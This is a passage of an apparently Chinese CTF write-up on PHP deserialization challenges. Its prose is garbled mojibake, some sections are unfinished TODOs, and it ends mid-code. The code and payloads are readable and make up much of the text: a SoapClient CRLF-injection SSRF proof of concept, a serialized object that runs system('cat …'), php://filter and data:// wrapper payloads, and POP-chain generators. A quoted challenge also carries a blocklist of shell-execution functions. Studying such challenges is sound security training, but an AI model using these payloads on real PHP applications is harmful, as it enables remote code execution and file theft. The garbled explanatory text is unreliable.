<li>åŒæ—¶æˆ‘ä»¬å¯ä»¥ä¼ å…¥<code>name=SoapClient</code>ï¼Œé‚£ä¹ˆæœ€å<code>call_user_func($b, $a)</code>å°±å˜æˆ<code>call_user_func(array('SoapClient','welcome_to_the_lctf2018'))</code>,å³<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>ï¼Œç”±äº<code>SoapClient</code>ç±»ä¸­æ²¡æœ‰<code>welcome_to_the_lctf2018</code>è¿™ä¸ªæ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•<code>__call()</code>ä»è€Œå‘é€è¯·æ±‚ã€‚</li>
<li>å‘é€è¯·æ±‚ä¹Ÿå°±æ˜¯å»è®¿é—®flag.phpï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸ºç¬¬äºŒæ­¥æˆ‘ä»¬è§„å®šçš„session_idçš„æ–‡ä»¶ä¸­ã€‚</li>
<li>å†ç”¨è¿™ä¸ªsessionè®¿é—®ä¸»é¡µï¼Œå°±ä¼š<code>var_dump</code>sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå…¶ä¸­å°±åŒ…å«å­—æ®µåä¸º<code>flag</code>çš„å€¼ã€‚</li>
</ol>
<p>å…ˆæ„é€ POCï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.$payload;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªpocå°±æ˜¯åˆ©ç”¨crlfä¼ªé€ è¯·æ±‚å»è®¿é—®flag.phpå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸º<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>çš„sessionä¸­ã€‚</p>
<p>å†æ³¨å…¥ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152347.png" alt=""></p>
<p>æ¥ç€è§¦å‘<code>SoapClient</code>çš„<code>__call</code>æ–¹æ³•å‘é€è¯·æ±‚ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152825.png" alt=""></p>
<p>æ›´æ”¹cookieè®¿é—®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623152931.png" alt=""></p>
<h3 id="åè®°">åè®°</h3>
<p>è¿™é“é¢˜å¡äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œè¿˜æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ã€‚ã€‚ã€‚ã€‚æœ‰ä¸€ä¸ªé—®é¢˜ä¸€ç›´å›°æ‰°æˆ‘ï¼Œå°±æ˜¯æŠŠPOCç”Ÿæˆçš„å­—ç¬¦ä¸²å†™åˆ°sessionæ–‡ä»¶åï¼Œä»–æ˜¯ä»€ä¹ˆæ—¶å€™æŠŠsessionçš„æ–‡ä»¶å†…å®¹ç»™ååºåˆ—åŒ–å‡ºæ¥äº†ã€‚åæ¥çœ‹äº†ä¸€ç¯‡æ–‡ç« æ‰çŸ¥é“ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200623153337.png" alt=""></p>
<p>äºæ˜¯å°±ååºåˆ—åŒ–äº†ä¸€ä¸ª<code>SoapClient</code>çš„å®ä¾‹ï¼Œå†è°ƒç”¨<code>__call</code>å‡½æ•°çš„æ—¶å€™å°±ä¼šé€šè¿‡è¿™ä¸ªå®ä¾‹å‘é€è¯·æ±‚ã€‚</p>
<h2 id="å¼ºç½‘æ¯2020é’é¾™ç»„-phpweb">å¼ºç½‘æ¯2020é’é¾™ç»„ phpweb</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>PHPååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç æœ‰ä¸¤ä¸ªéšè—è¾“å…¥æ¡†</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704180308.png" alt=""></p>
<p>éšä¾¿è¾“å…¥æµ‹è¯•ï¼Œæœ‰ä¸€ä¸ªæŠ¥é”™å›æ˜¾ï¼Œå‘ç°è¿™ä¸¤ä¸ªè¾“å…¥æ¡†æ˜¯call_user_funcå‡½æ•°çš„å‚æ•°ã€‚</p>
<p>å¹¶ä¸”åŸºæœ¬ä¸Šè¿‡æ»¤å±é™©å‡½æ•°ï¼Œç”¨file_get_contentsè¯»å–<code>index.php</code>æºç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„<code>__destruct</code>å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‡½æ•°å¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¸è¿‡æ²¡æœ‰è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ã€‚</p>
<p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åˆ©ç”¨<code>gettime</code>å‡½æ•°ä¸­çš„<code>call_user_func</code>å‡½æ•°ä¼ å…¥<code>unserialize</code>å‡½æ•°ï¼Œç”Ÿæˆå­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure>
<p>ä¼ å…¥å‚æ•°<code>unserialize</code>å’Œ<code>O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>ã€‚</p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2>
<h3 id="TODO">TODO</h3>
<h2 id="å®‰æ´µæ¯-2019-easy-serialize-php">[å®‰æ´µæ¯ 2019] easy_serialize_php</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
<li>PHP ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®æç¤ºæŸ¥çœ‹phpinfo</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703230203.png" alt=""></p>
<p>ç›´æ¥è®¿é—®d0g3_f1ag.phpæ²¡æœ‰å›æ˜¾ã€‚</p>
<h3 id="TODO-v2">TODO</h3>
<h2 id="ZJCTF2019-NiZhuanSiWei">[ZJCTF2019]NiZhuanSiWei</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
<li>æ–‡ä»¶åŒ…å«</li>
<li>PHPååºåˆ—åŒ–</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>ç›´æ¥ç»™å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="file-get-contentsç»•è¿‡">file_get_contentsç»•è¿‡</h4>
<p>æœ‰ä¸¤ç§æ–¹å¼ç»•è¿‡ï¼š</p>
<ol>
<li>ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡<br>
â‘  å°†è¦GETçš„å‚æ•°?xxx=php://input<br>
â‘¡ ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼</li>
<li>ç”¨data://ä¼ªåè®®ç»•è¿‡<br>
å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64ï¼Œæƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç <br>
æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹)</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<h4 id="è¯»å–useless-php">è¯»å–useless.php</h4>
<p>é¢˜ç›®æœ‰ç¬¬äºŒä¸ªå‚æ•°fileï¼Œå¤§æ¦‚æ˜¯include()è¿™ä¸ªfileï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬è¦åŒ…å«useless.phpï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªåˆ¤æ–­æ˜¯fileå‚æ•°ä¸èƒ½ä¼ å…¥flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.phpã€‚</p>
<p>åˆ©ç”¨php://filteråè®®è¯»å–è¿™ä¸ªuseless.phpï¼Œæ„é€ payloadè¯»å–useless.phpï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>useless.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;HAHAHAHAHA&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h4>
<p>useless.phpçš„é­”æœ¯æ–¹æ³•æ˜¯<code>__toString()</code>ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨<code>echo $password</code>è§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚</p>
<p>ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> Flag();</span><br><span class="line">$s = serialize($o);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ç»¼åˆèµ·æ¥çš„payloadå°±æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MRCTF2020-Ezpop">[MRCTF2020]Ezpop</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>POPé“¾æ„é€ </li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$m = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t-&gt;p = $m;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">$s-&gt;str = $t;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br></pre></td></tr></table></figure>
<h2 id="EIS-2019-EzPOP">[EIS 2019]EzPOP</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>POPé“¾æ„é€ </li>
<li>php://filter ç»•è¿‡exit()</li>
<li>base64ç¼–ç è§„åˆ™</li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span 